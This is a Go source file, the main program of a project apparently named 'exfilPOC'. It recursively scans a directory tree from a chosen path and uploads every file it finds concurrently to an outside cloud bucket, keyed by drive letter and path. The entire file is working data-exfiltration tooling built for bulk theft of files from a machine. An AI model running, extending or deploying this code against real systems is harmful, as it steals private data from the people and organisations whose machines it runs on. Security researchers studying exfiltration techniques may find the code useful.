package main

import (
	"context"
	"flag"
	"fmt"
	"io"
	"log"
	"os"
	"path/filepath"
	"runtime"
	"runtime/pprof"
	"sync"
	"time"

	"exfilPOC/internal/uploader"
	"exfilPOC/internal/walker"
	cfg "exfilPOC/pkg/config"
)

var (
	startPath   = flag.String("path", ".", "Path to start scanning from")
	cpuprofile  = flag.String("cpuprofile", "", "Write cpu profile to file")
	maxWorkers  = flag.Int("workers", runtime.NumCPU()*2, "Number of concurrent upload workers")
	maxFileSize = flag.Int64("maxsize", 1024*1024*100, "Maximum file size in bytes for grouping")
)

func main() {
	flag.Parse()

	if *cpuprofile != "" {
		f, err := os.Create(*cpuprofile)
		if err != nil {
			log.Fatal(err)
		}
		pprof.StartCPUProfile(f)
		defer pprof.StopCPUProfile()
	}

	log.SetOutput(os.Stdout)
	log.Println("Logging setup!")

	config := cfg.NewDefaultConfig()

	config.Concurrency.Workers = *maxWorkers

	ctx, cancel := context.WithTimeout(context.Background(), 24*time.Hour)
	defer cancel()

	up, err := uploader.NewUploader(config)
	if err != nil {
		log.Fatalf("Failed to create uploader: %v", err)
	}

	w := walker.NewWalker(*maxFileSize)
	startTime := time.Now()
	log.Printf("Starting file scan from: %s", *startPath)
	files, err := w.FindFiles(*startPath)
	if err != nil {
		log.Fatalf("Failed to scan files: %v", err)
	}
	scanDuration := time.Since(startTime)
	log.Printf("Found %d files in %v", len(files), scanDuration)

	if len(files) == 0 {
		log.Println("No files found to upload.")
		return
	}

	groups := w.GroupFiles(files)
	log.Printf("Organized into %d upload groups", len(groups))

	type uploadTask struct {
		key    string
		reader io.Reader
		size   int64
	}

	tasks := make(chan uploadTask, len(files))
	var wg sync.WaitGroup
	errChan := make(chan error, len(files))

	for i := 0; i < *maxWorkers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for task := range tasks {
				if err := up.UploadFile(ctx, task.key, task.reader, task.size); err != nil {
					errChan <- fmt.Errorf("failed to upload %s: %v", task.key, err)
				}

				if c, ok := task.reader.(io.Closer); ok {
					c.Close()
				}
			}
		}()
	}

	uploadStartTime := time.Now()
	for _, group := range groups {
		for _, file := range group {
			f, err := os.Open(file.Path)
			if err != nil {
				log.Printf("Failed to open file %s: %v", file.Path, err)
				continue
			}

			driveLetter := filepath.VolumeName(file.Path)
			pathWithoutDrive := file.Path[len(driveLetter):]
			b2Key := filepath.ToSlash(fmt.Sprintf("%s%s", driveLetter[0:1], pathWithoutDrive))

			tasks <- uploadTask{
				key:    b2Key,
				reader: f,
				size:   file.Size,
			}
		}
	}

	close(tasks)
	wg.Wait()
	close(errChan)

	var uploadErrors []error
	for err := range errChan {
		uploadErrors = append(uploadErrors, err)
	}

	uploadDuration := time.Since(uploadStartTime)
	log.Printf("Upload completed in %v", uploadDuration)
	log.Printf("Total operation time: %v", time.Since(startTime))

	if len(uploadErrors) > 0 {
		log.Printf("Encountered %d errors during upload:", len(uploadErrors))
		for _, err := range uploadErrors {
			log.Printf("  - %v", err)
		}
	}

	log.Println("Program completed.")
}
